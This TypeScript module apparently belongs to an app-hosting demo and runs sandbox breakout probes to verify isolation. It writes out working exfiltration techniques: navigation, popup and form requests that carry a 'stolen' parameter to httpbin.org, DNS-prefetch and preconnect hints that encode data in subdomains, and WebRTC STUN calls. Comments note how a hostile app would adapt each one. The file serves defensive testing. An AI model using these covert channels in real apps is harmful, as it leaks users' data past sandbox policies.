/**
 * Breakout probes: deliberate attempts to escape the hosted-app sandbox.
 *
 * The Network tab asks "may I call this host?". These probes ask the harder
 * question: "can I leave at all?" Each one attacks a specific layer described in
 * `mindoodb/docs/hosted-app-isolation.md`, so a run doubles as a live check that
 * the documented containment is really in place.
 *
 * Two things to keep in mind when reading the results:
 *
 * - **A throw is a pass.** Every probe here is supposed to fail. `contained`
 *   means the browser or Haven refused; `escaped` means the app got out and the
 *   isolation model has a hole.
 * - **External mode is expected to fail almost all of them.** External apps run
 *   outside every policy Haven can apply, so these results are the argument for
 *   keeping external mode to loopback dev servers, not a bug report.
 * - **Storage and the wrapper DOM are not breakouts.** Each hosted app has an
 *   origin of its own, so it has real storage and a readable wrapper parent —
 *   both scoped to that origin and reaching nothing else. Probes that once
 *   treated a working origin as an escape were written for the old model where
 *   apps shared Haven's origin.
 *
 * @module isolationProbes
 */
import { readMindooDBAppHostingMode, type MindooDBAppHostingMode } from "mindoodb-app-sdk";

import { t, tn, type MessageKey } from "@/i18n";

/**
 * Where a successful breakout would send data. httpbin is deliberately the same
 * host the Network tab uses as its not-on-the-allowlist example, so both tabs
 * tell one story.
 */
export const BREAKOUT_ORIGIN = "https://httpbin.org";

/**
 * Bundle id a hosted app would guess to reach a *different* app's assets. The
 * wrapper's `frame-src` names one bundle prefix, so this must not resolve.
 */
export const OTHER_BUNDLE_ID = "mindoodb-breakout-probe";

export type IsolationProbeId =
  | "self-navigation"
  | "cross-bundle-navigation"
  | "top-navigation"
  | "parent-navigation"
  | "nested-iframe"
  | "popup"
  | "form-action"
  | "haven-dom"
  | "app-storage"
  | "service-worker"
  | "cross-bundle-fetch"
  | "haven-page-fetch"
  | "webrtc"
  | "dns-prefetch";

/** `contained` is the desired result for every probe except the WebRTC one. */
export type IsolationOutcome = "contained" | "escaped" | "inconclusive";

export interface IsolationProbe {
  id: IsolationProbeId;
  label: string;
  /** The isolation layer this attacks, phrased the way the doc phrases it. */
  layer: string;
  /** What should happen in hosted mode. */
  hostedExpectation: string;
  /**
   * True when success would navigate the app away and end the session. Those
   * are kept out of "run all" so one click cannot destroy the demo.
   */
  endsSession?: boolean;
  /**
   * True when the probe genuinely sends packets to a third party rather than
   * only attempting to. Still listed and runnable on its own, but kept out of
   * "run all": a batch button should not reach out to someone else's server
   * without the person pressing it having chosen that specific probe.
   */
  sendsRealTraffic?: boolean;
}

export interface IsolationProbeResult {
  id: IsolationProbeId;
  outcome: IsolationOutcome;
  detail: string;
  elapsedMs: number;
}

/** The probe texts live in src/i18n as `<textKey>Label`, `<textKey>Layer` and `<textKey>Expect`. */
type ProbeTextKey = MessageKey extends infer K ? (K extends `${infer Base}Label` ? Base : never) : never;

/** A probe whose texts are getters, so they follow a language change. */
function defineProbe(
  id: IsolationProbeId,
  textKey: ProbeTextKey,
  flags: Pick<IsolationProbe, "endsSession" | "sendsRealTraffic"> = {},
): IsolationProbe {
  return {
    id,
    get label() {
      return t(`${textKey}Label` as MessageKey);
    },
    get layer() {
      return t(`${textKey}Layer` as MessageKey);
    },
    get hostedExpectation() {
      return t(`${textKey}Expect` as MessageKey);
    },
    ...flags,
  };
}

export const ISOLATION_PROBES: IsolationProbe[] = [
  defineProbe("self-navigation", "probeSelfNavigation", { endsSession: true }),
  defineProbe("cross-bundle-navigation", "probeCrossBundleNavigation", { endsSession: true }),
  defineProbe("top-navigation", "probeTopNavigation", { endsSession: true }),
  defineProbe("parent-navigation", "probeParentNavigation", { endsSession: true }),
  defineProbe("nested-iframe", "probeNestedIframe"),
  defineProbe("popup", "probePopup"),
  defineProbe("form-action", "probeFormAction"),
  defineProbe("haven-dom", "probeHavenDom"),
  defineProbe("app-storage", "probeAppStorage"),
  defineProbe("service-worker", "probeServiceWorker"),
  defineProbe("cross-bundle-fetch", "probeCrossBundleFetch"),
  defineProbe("haven-page-fetch", "probeHavenPageFetch"),
  defineProbe("webrtc", "probeWebrtc", { sendsRealTraffic: true }),
  defineProbe("dns-prefetch", "probeDnsPrefetch", { sendsRealTraffic: true }),
];

export function isolationProbe(id: IsolationProbeId): IsolationProbe {
  const probe = ISOLATION_PROBES.find((entry) => entry.id === id);
  if (!probe) {
    throw new Error(`Unknown isolation probe "${id}".`);
  }
  return probe;
}

export function safeProbes(): IsolationProbe[] {
  return ISOLATION_PROBES.filter((probe) => !probe.endsSession);
}

/**
 * What "run all" actually runs. Narrower than {@link safeProbes}, which is the
 * *rendered* list — a probe that reaches a third-party server stays visible and
 * individually runnable, it just is not swept up by the batch button.
 */
export function batchProbes(): IsolationProbe[] {
  return safeProbes().filter((probe) => !probe.sendsRealTraffic);
}

export function sessionEndingProbes(): IsolationProbe[] {
  return ISOLATION_PROBES.filter((probe) => probe.endsSession);
}

/**
 * STUN server the WebRTC probe points at. Any host off the app's allowlist
 * would do; a public STUN server is used because it answers reliably and costs
 * nobody anything. A hostile app would put its own TURN server here instead,
 * which relays payload rather than just reflecting an address back.
 */
const WEBRTC_PROBE_STUN_URL = "stun:stun.l.google.com:19302";

/** How long to wait for ICE gathering before calling the result unclear. */
const WEBRTC_PROBE_TIMEOUT_MS = 5_000;

/**
 * Zone the DNS probe invents a name under. Deliberately the app runner's own
 * zone: it has a wildcard record, so the name resolves instead of being
 * short-circuited, and its authoritative DNS is somewhere the operator of this
 * Haven can actually go and look. A hostile app would use a zone it controls
 * and read the payload straight out of its query log.
 */
const DNS_PROBE_ZONE = "mindoodb-apprunner.com";

/** How long to wait for a CSP violation to arrive before concluding none will. */
const DNS_PROBE_TIMEOUT_MS = 750;

/**
 * The URL a breakout would exfiltrate to. The marker stands in for whatever the
 * app scraped out of its mapped databases — the point of a navigation-based
 * leak is that the payload rides along in the query string.
 */
export function buildBreakoutUrl(marker: string): string {
  const url = new URL("/get", BREAKOUT_ORIGIN);
  url.searchParams.set("stolen", marker);
  return url.toString();
}

/**
 * Path a hosted app would use to reach a sibling bundle. Relative, because the
 * app does not know Haven's origin or its own bundle id, and `..` from the
 * bundle prefix is exactly the guess an attacker would make.
 */
export function crossBundlePath(file = "index.html"): string {
  return `../${OTHER_BUNDLE_ID}/${file}`;
}

export function formatProbeError(error: unknown): string {
  if (error instanceof DOMException) {
    return `${error.name}: ${error.message}`;
  }
  if (error instanceof Error) {
    return error.message ? `${error.name}: ${error.message}` : error.name;
  }
  return String(error);
}

export interface IsolationSummary {
  contained: number;
  escaped: number;
  inconclusive: number;
}

export function summarizeIsolationResults(results: IsolationProbeResult[]): IsolationSummary {
  return results.reduce<IsolationSummary>(
    (summary, result) => ({ ...summary, [result.outcome]: summary[result.outcome] + 1 }),
    { contained: 0, escaped: 0, inconclusive: 0 },
  );
}

/**
 * What the probe is expected to do in the mode the app is actually running in.
 *
 * External apps keep their own origin and their own storage, and Haven applies
 * no policy to them, so telling the reader "this should be blocked" there would
 * be wrong.
 */
export function describeExpectation(
  probe: IsolationProbe,
  hosting: MindooDBAppHostingMode,
): string {
  if (hosting === "hosted") {
    return probe.hostedExpectation;
  }
  return t("probeExternalExpect");
}

/** "a", "a and b", "a and b and c" in the current language. */
function joinAnd(items: string[]): string {
  return items.reduce((joined, item) => (joined ? t("listAnd", { first: joined, second: item }) : item), "");
}

function delay(ms: number) {
  return new Promise<void>((resolve) => {
    window.setTimeout(resolve, ms);
  });
}

function elapsedSince(startedAt: number) {
  return Math.max(0, Math.round(performance.now() - startedAt));
}

/**
 * Ask for a navigation and then check whether we are still here.
 *
 * There is no event for "navigation refused by CSP" on this document — the
 * violation is reported on the frame's parent — so the only signal available to
 * the app is that it still exists a moment later. When the navigation does go
 * through, this never returns: the document is gone.
 */
async function attemptNavigation(navigate: () => void): Promise<IsolationProbeResult["outcome"]> {
  const before = window.location.href;
  navigate();
  await delay(900);
  return window.location.href === before ? "contained" : "escaped";
}

/**
 * Did a frame we created actually load the cross-origin document we asked for?
 *
 * We cannot read a cross-origin document, and that is precisely the signal: a
 * frame CSP refused stays on `about:blank`, which an opaque-origin parent may
 * still read, while a frame that really loaded httpbin throws on the same read.
 */
/**
 * Runs a frame navigation attempt and judges it, preferring the CSP violation
 * event over what the frame looks like afterwards.
 *
 * Reading the frame is a poor primary signal. A refusal can leave the frame on
 * a browser error document, and that document is cross-origin too — so the read
 * throws exactly like it would if the target really had loaded. The violation
 * event does not have that ambiguity: it fires only when a directive refused,
 * and it names which one.
 */
async function judgeFrameNavigation(options: {
  frame: HTMLIFrameElement;
  target: string;
  attempt: () => void;
  settleMs: number;
}): Promise<{ outcome: IsolationOutcome; detail: string }> {
  const host = new URL(options.target).host;
  const refusals: string[] = [];
  const onViolation = (event: SecurityPolicyViolationEvent) => {
    if (!event.blockedURI.includes(host)) {
      return;
    }
    refusals.push(event.violatedDirective || t("unnamedDirective"));
  };

  document.addEventListener("securitypolicyviolation", onViolation);
  try {
    options.attempt();
    await delay(options.settleMs);
  } finally {
    document.removeEventListener("securitypolicyviolation", onViolation);
  }

  if (refusals.length) {
    return {
      outcome: "contained",
      detail: t("refusedBy", { directives: joinAnd([...new Set(refusals)]) }),
    };
  }
  const inspection = inspectFrameNavigation(options.frame);
  if (inspection.outcome === "contained") {
    return inspection;
  }
  return {
    outcome: inspection.outcome,
    detail: t("noViolationFired", { detail: inspection.detail }),
  };
}

function inspectFrameNavigation(frame: HTMLIFrameElement): {
  outcome: IsolationOutcome;
  detail: string;
} {
  try {
    const href = frame.contentWindow?.location.href ?? "";
    if (!href || href === "about:blank") {
      return { outcome: "contained", detail: t("frameStayedBlank") };
    }
    return { outcome: "escaped", detail: t("frameLoaded", { url: href }) };
  } catch (error) {
    // Reading threw, so a real cross-origin document is sitting in there.
    return {
      outcome: "escaped",
      detail: t("frameLoadedCrossOrigin", { error: formatProbeError(error) }),
    };
  }
}

/**
 * A label unique per run. Without it the second run would hit the DNS cache and
 * never leave the machine, which would look like containment.
 */
function probeMarker(): string {
  const random = globalThis.crypto?.randomUUID?.();
  return (random ?? Math.random().toString(36).slice(2)).replace(/-/g, "").slice(0, 12);
}

/**
 * Inserts a resource hint and resolves with the CSP *violation event*, or null
 * if none arrived in time.
 *
 * That is only the middle layer: DOM insertion always succeeds, and a missing
 * event is not a DNS query. Authoritative evidence is a log on the zone that
 * owns {@link DNS_PROBE_ZONE}. `X-DNS-Prefetch-Control` is the wrong signal
 * here — Chromium applies it to hyperlinks, not to these `<link>` hints.
 */
function insertResourceHint(rel: string, host: string): Promise<string | null> {
  return new Promise((resolve) => {
    const onViolation = (event: SecurityPolicyViolationEvent) => {
      if (!event.blockedURI.includes(host)) {
        return;
      }
      finish(event.violatedDirective || "unnamed directive");
    };
    const finish = (directive: string | null) => {
      clearTimeout(timer);
      document.removeEventListener("securitypolicyviolation", onViolation);
      link.remove();
      resolve(directive);
    };
    const timer = setTimeout(() => finish(null), DNS_PROBE_TIMEOUT_MS);
    document.addEventListener("securitypolicyviolation", onViolation);
    const link = document.createElement("link");
    link.rel = rel;
    link.href = `//${host}`;
    document.head.append(link);
  });
}

type WebrtcGatherResult =
  | { kind: "reflexive"; type: string }
  | { kind: "gathering-complete"; hostCount: number }
  | { kind: "timeout" };

/**
 * Waits for a candidate that could only exist if the STUN/TURN server answered
 * ("srflx" or "relay"). Host candidates prove nothing — the browser invents
 * those from local interfaces without sending a packet.
 *
 * Gathering ending *without* a reflexive candidate is not the same as the
 * timeout. Chrome finishes gathering in well under a second when ICE is
 * administratively prohibited (Connection-Allowlist / CSP webrtc). A real
 * STUN blackhole sits out ICE retransmits and hits the timer.
 */
function waitForReflexiveCandidate(connection: RTCPeerConnection): Promise<WebrtcGatherResult> {
  return new Promise((resolve) => {
    let hostCount = 0;
    const finish = (result: WebrtcGatherResult) => {
      clearTimeout(timer);
      connection.removeEventListener("icecandidate", onCandidate);
      resolve(result);
    };
    const onCandidate = (event: RTCPeerConnectionIceEvent) => {
      if (!event.candidate) {
        finish({ kind: "gathering-complete", hostCount });
        return;
      }
      const type = reflexiveCandidateType(event.candidate);
      if (type) {
        finish({ kind: "reflexive", type });
        return;
      }
      hostCount += 1;
    };
    const timer = setTimeout(() => finish({ kind: "timeout" }), WEBRTC_PROBE_TIMEOUT_MS);
    connection.addEventListener("icecandidate", onCandidate);
  });
}

/**
 * `RTCIceCandidate.type` is unset in some engines, so fall back to the SDP
 * attribute, where the type follows the literal "typ" token.
 */
function reflexiveCandidateType(candidate: RTCIceCandidate): string | null {
  const type = candidate.type ?? /\btyp\s+(\w+)/.exec(candidate.candidate)?.[1] ?? null;
  return type === "srflx" || type === "relay" ? type : null;
}

async function runProbeById(id: IsolationProbeId): Promise<Omit<IsolationProbeResult, "elapsedMs">> {
  switch (id) {
    case "self-navigation": {
      const target = buildBreakoutUrl("mapped-database-contents");
      try {
        const outcome = await attemptNavigation(() => {
          window.location.href = target;
        });
        return {
          id,
          outcome,
          detail:
            outcome === "contained"
              ? t("stillHereNoRequest", { url: target })
              : t("navigatedTo", { url: target }),
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "cross-bundle-navigation": {
      const target = crossBundlePath();
      try {
        const outcome = await attemptNavigation(() => {
          window.location.href = target;
        });
        return {
          id,
          outcome,
          detail:
            outcome === "contained"
              ? t("stillHere", { url: target })
              : t("navigatedTo", { url: window.location.href }),
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "top-navigation": {
      const target = buildBreakoutUrl("top-navigation");
      try {
        // Reading `top.location.href` throws on its own across an opaque
        // boundary, so assign without reading first.
        window.top!.location.href = target;
        await delay(900);
        return {
          id,
          outcome: "contained",
          detail: t("topDidNotMove"),
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "parent-navigation": {
      const target = buildBreakoutUrl("parent-navigation");
      try {
        window.parent.location.href = target;
        await delay(900);
        return {
          id,
          outcome: window.parent === window.self ? "inconclusive" : "contained",
          detail:
            window.parent === window.self
              ? t("notFramedNoParent")
              : t("parentDidNotMove"),
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "nested-iframe": {
      const target = buildBreakoutUrl("nested-iframe");
      const frame = document.createElement("iframe");
      frame.setAttribute("aria-hidden", "true");
      frame.style.display = "none";
      document.body.appendChild(frame);
      const verdict = await judgeFrameNavigation({
        frame,
        target,
        attempt: () => {
          frame.src = target;
        },
        settleMs: 1200,
      });
      frame.remove();
      return {
        id,
        outcome: verdict.outcome,
        detail: t("nestedIframeRequested", { url: target, verdict: verdict.detail }),
      };
    }

    case "popup": {
      const target = buildBreakoutUrl("popup");
      // Deliberately no `noopener`: that feature makes window.open return null
      // even on success, which would report every popup as blocked.
      const opened = window.open(target, "_blank");
      if (!opened) {
        return {
          id,
          outcome: "contained",
          detail: t("popupBlocked"),
        };
      }
      opened.close();
      return {
        id,
        outcome: "escaped",
        detail: t("popupOpened", { url: target }),
      };
    }

    case "form-action": {
      const target = buildBreakoutUrl("form-action");
      const sink = document.createElement("iframe");
      sink.name = `probe-form-sink-${Date.now()}`;
      sink.setAttribute("aria-hidden", "true");
      sink.style.display = "none";
      document.body.appendChild(sink);

      const form = document.createElement("form");
      form.method = "GET";
      form.action = target;
      // Targeting a hidden frame keeps a successful post from replacing the app.
      form.target = sink.name;
      form.style.display = "none";
      document.body.appendChild(form);
      try {
        const verdict = await judgeFrameNavigation({
          frame: sink,
          target,
          attempt: () => {
            form.submit();
          },
          settleMs: 900,
        });
        return {
          id,
          outcome: verdict.outcome,
          detail: t("formSubmitted", { url: target, verdict: verdict.detail }),
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      } finally {
        form.remove();
        sink.remove();
      }
    }

    case "haven-dom": {
      // Reach for Haven, which is `window.top`. `window.parent` is the
      // containment wrapper, and that one is same-origin with the app on
      // purpose: it has to be served from the app origin to carry a `frame-src`
      // about that origin's paths. Reading it proves nothing — it holds a
      // single iframe and no data — so probing it would report a break-in to a
      // room the app already owns.
      if (window.top === window.self) {
        return {
          id,
          outcome: "inconclusive",
          detail: t("notFramedNoHaven"),
        };
      }
      let wrapperNote = "";
      try {
        wrapperNote = ` ${t("wrapperReadable", { title: window.parent.document.title })}`;
      } catch {
        // External mode frames the app directly, so there is no wrapper.
      }
      try {
        const title = window.top?.document.title;
        return {
          id,
          outcome: "escaped",
          detail: t("havenDocumentRead", { title: String(title) }),
        };
      } catch (error) {
        return { id, outcome: "contained", detail: `${formatProbeError(error)}${wrapperNote}` };
      }
    }

    case "app-storage": {
      // Working storage is not a breakout. Each app runs on its own origin, so
      // the bucket it reaches belongs to that origin — never Haven's, never
      // another app's. The browser's same-origin policy is what guarantees it,
      // which is why there is nothing here for the app to defeat.
      try {
        const probeKey = "mindoodb-breakout-probe";
        window.localStorage.setItem(probeKey, "1");
        window.localStorage.removeItem(probeKey);
        return {
          id,
          outcome: "contained",
          detail: t("storageScoped", { origin: window.location.origin }),
        };
      } catch (error) {
        return {
          id,
          outcome: "inconclusive",
          detail: t("storageMissing", { error: formatProbeError(error) }),
        };
      }
    }

    case "service-worker": {
      if (!("serviceWorker" in navigator)) {
        return {
          id,
          outcome: "contained",
          detail: t("serviceWorkerUnavailable"),
        };
      }
      let registration: ServiceWorkerRegistration;
      try {
        registration = await navigator.serviceWorker.register("./breakout-sw.js");
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
      // Registering at all is the finding, so undo it straight away. Left in
      // place this worker would control the app on its next load, and the demo
      // would run hijacked from then on — see `public/breakout-sw.js`.
      try {
        return {
          id,
          outcome: "escaped",
          detail: t("serviceWorkerRegistered", { scope: registration.scope }),
        };
      } finally {
        await registration.unregister();
      }
    }

    case "cross-bundle-fetch": {
      const target = crossBundlePath();
      try {
        const response = await fetch(target);
        return {
          id,
          outcome: response.ok ? "escaped" : "contained",
          detail: t("httpStatusFor", { status: response.status, url: target }),
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "haven-page-fetch": {
      try {
        const response = await fetch("/index.html");
        return {
          id,
          outcome: response.ok ? "escaped" : "contained",
          detail: t("httpStatusHavenPage", { status: response.status }),
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "webrtc": {
      if (typeof RTCPeerConnection === "undefined") {
        return {
          id,
          outcome: "contained",
          detail: t("webrtcUnavailable"),
        };
      }
      const connection = new RTCPeerConnection({
        iceServers: [{ urls: WEBRTC_PROBE_STUN_URL }],
      });
      try {
        connection.createDataChannel("probe");
        const gathered = waitForReflexiveCandidate(connection);
        await connection.setLocalDescription(await connection.createOffer());
        const result = await gathered;
        if (result.kind === "reflexive") {
          return {
            id,
            outcome: "escaped",
            detail: t("webrtcEscaped", { type: result.type, server: WEBRTC_PROBE_STUN_URL }),
          };
        }
        if (result.kind === "timeout") {
          return {
            id,
            outcome: "inconclusive",
            detail: t("webrtcTimeout", { ms: WEBRTC_PROBE_TIMEOUT_MS }),
          };
        }
        return {
          id,
          outcome: "contained",
          detail: tn("webrtcContained", result.hostCount),
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      } finally {
        connection.close();
      }
    }

    case "dns-prefetch": {
      const marker = probeMarker();
      // Two hints, because they leak differently. `dns-prefetch` is a name
      // lookup; `preconnect` adds TCP and, on HTTPS, TLS (SNI repeats the name).
      // The payload is the hostname either way. "Blocked" here means a CSP
      // `securitypolicyviolation` fired — not that the resolver was silent.
      const dnsHost = `stolen-${marker}.${DNS_PROBE_ZONE}`;
      const preconnectHost = `stolen-${marker}-pre.${DNS_PROBE_ZONE}`;
      const [dnsViolation, preconnectViolation] = await Promise.all([
        insertResourceHint("dns-prefetch", dnsHost),
        insertResourceHint("preconnect", preconnectHost),
      ]);

      if (dnsViolation && preconnectViolation) {
        return {
          id,
          outcome: "contained",
          detail: t("dnsBothReported", {
            first: dnsViolation,
            second: preconnectViolation,
            dnsHost,
            preconnectHost,
          }),
        };
      }
      const survived = [
        dnsViolation ? null : `dns-prefetch → ${dnsHost}`,
        preconnectViolation ? null : `preconnect → ${preconnectHost}`,
      ].filter((entry): entry is string => entry !== null);
      return {
        id,
        outcome: "inconclusive",
        detail: t("dnsNotReported", { hints: joinAnd(survived), marker }),
      };
    }

    default: {
      const exhaustive: never = id;
      throw new Error(`Unhandled isolation probe "${String(exhaustive)}".`);
    }
  }
}

export async function runIsolationProbe(id: IsolationProbeId): Promise<IsolationProbeResult> {
  const startedAt = performance.now();
  try {
    const result = await runProbeById(id);
    return { ...result, elapsedMs: elapsedSince(startedAt) };
  } catch (error) {
    // A probe that throws on its way out still tells us the app was stopped.
    return {
      id,
      outcome: "contained",
      detail: formatProbeError(error),
      elapsedMs: elapsedSince(startedAt),
    };
  }
}

export function currentHostingMode(): MindooDBAppHostingMode {
  return readMindooDBAppHostingMode();
}
